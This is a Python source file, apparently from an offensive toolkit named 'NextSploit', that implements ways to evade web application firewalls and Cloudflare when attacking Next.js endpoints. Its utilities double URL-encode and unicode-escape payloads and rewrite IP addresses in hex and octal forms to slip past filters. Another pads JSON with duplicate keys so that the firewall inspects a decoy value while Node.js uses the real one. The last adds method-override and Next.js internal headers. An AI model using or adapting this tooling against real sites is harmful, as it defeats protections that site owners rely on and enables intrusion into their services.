#!/usr/bin/env python3
"""
NextSploit — Core WAF & Cloudflare Evasion Utilities
Implements advanced bypass techniques for Next.js endpoints.
"""

import urllib.parse
import json

class WAFBypass:
    @staticmethod
    def double_encode(payload: str) -> str:
        """URL double encoding to bypass signature checks."""
        return urllib.parse.quote(urllib.parse.quote(payload))

    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Encode characters to Unicode escape sequences (e.g. \\u002e)."""
        return "".join(f"\\u{ord(c):04x}" if c in "./" else c for c in payload)

    @staticmethod
    def get_hex_ip(ip: str) -> str:
        """Convert IP (e.g. 127.0.0.1) to hex representation (0x7f000001)."""
        try:
            parts = [int(p) for p in ip.split(".")]
            if len(parts) == 4:
                return f"0x{parts[0]:02x}{parts[1]:02x}{parts[2]:02x}{parts[3]:02x}"
        except Exception:
            pass
        return ip
        
    @staticmethod
    def get_octal_ip(ip: str) -> str:
        """Convert IP to octal representation."""
        try:
            parts = [int(p) for p in ip.split(".")]
            if len(parts) == 4:
                return f"0{parts[0]:03o}.0{parts[1]:03o}.0{parts[2]:03o}.0{parts[3]:03o}"
        except Exception:
            pass
        return ip

    @staticmethod
    def obfuscate_json(data: dict, pad_size: int = 8192) -> str:
        """
        Pad JSON payload to bypass WAF buffer inspection (Large Payload Overflow).
        Also includes duplicate keys. WAF checks the first key, Node.js parses the last.
        """
        safe_data = {k: "safe_value_for_waf" for k in data.keys()}
        
        # Build JSON manually to inject padding and duplicate keys
        # Format: {"key":"safe", "padding":"...", "key":"real_value"}
        
        json_parts = []
        for k, v in data.items():
            # Inject a safe duplicate first
            json_parts.append(f'"{k}": "safe_dummy_value"')
            
        # Add huge padding
        padding = " " * pad_size
        json_parts.append(f'"_waf_padding": "{padding.strip()}"')
        
        # Add the real payload values that Node.js will actually use
        for k, v in data.items():
            val_str = json.dumps(v)
            json_parts.append(f'"{k}": {val_str}')
            
        return "{\n  " + ",\n  ".join(json_parts) + "\n}"

    @staticmethod
    def manipulate_headers(headers: dict) -> dict:
        """
        Manipulate headers to evade WAFs:
        - HTTP Method Override
        - Charset variations
        - Next.js internal headers
        """
        bypassed_headers = dict(headers)
        
        # Method Override to confuse WAFs blocking POST
        bypassed_headers["X-HTTP-Method-Override"] = "POST"
        
        # Asymmetry content type
        if "Content-Type" in bypassed_headers:
            ct = bypassed_headers["Content-Type"]
            if "application/json" in ct:
                # Add random charset and trailing spaces
                bypassed_headers["Content-Type"] = "application/json; charset=utf-8; fw=next"
        
        # Internal Next.js evasion header
        bypassed_headers["X-NextJS-Data"] = "1"
        bypassed_headers["Purpose"] = "prefetch"
        
        return bypassed_headers
